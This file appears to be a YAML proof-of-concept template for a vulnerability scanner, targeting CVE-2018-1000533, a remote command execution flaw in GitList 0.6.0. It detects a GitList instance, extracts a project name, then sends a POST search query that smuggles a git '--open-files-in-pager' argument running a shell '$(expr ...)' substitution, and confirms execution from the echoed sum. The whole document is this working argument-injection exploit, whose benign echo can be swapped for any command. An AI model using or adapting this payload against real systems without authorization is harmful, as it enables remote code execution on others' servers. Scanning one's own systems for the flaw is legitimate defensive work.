name: poc-yaml-gitlist-rce-cve-2018-1000533
set:
  r1: randomInt(800000000, 1000000000)
  r2: randomInt(800000000, 1000000000)
  r3: randomLowercase(8)
rules:
  - method: GET
    path: /
    search: |
      <span class="name">(?P<project_name>.+?)</span>
    expression: |
      response.status == 200 && "gitlist".bmatches(response.body)
  - method: POST
    path: /{{project_name}}/tree/a/search
    headers:
      Content-Type: application/x-www-form-urlencoded
    body: |
      query=--open-files-in-pager=echo%20{{r3}}:$(expr%20{{r1}}%20%2b%20{{r2}}):{{r1}}:{{r1}}
    expression: |
      response.status == 200 && response.body.bcontains(bytes(string(r1 + r2)))
detail:
  author: Print1n(https://print1n.top)
  description: gitlist 0.6.0 远程命令执行漏洞（CVE-2018-1000533）
  links:
    - https://github.com/vulhub/vulhub/tree/master/gitlist/CVE-2018-1000533